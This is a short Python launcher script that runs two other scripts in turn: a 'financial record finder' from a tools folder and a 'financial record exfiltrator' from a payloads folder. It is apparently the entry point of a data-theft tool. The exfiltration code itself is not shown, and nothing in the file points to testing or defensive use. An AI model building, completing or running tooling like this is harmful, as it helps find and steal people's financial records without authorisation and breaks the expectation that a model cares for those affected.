import subprocess
import os

def main():
    # Run the financial record finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "financial_record_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the financial record exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "financial_record_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
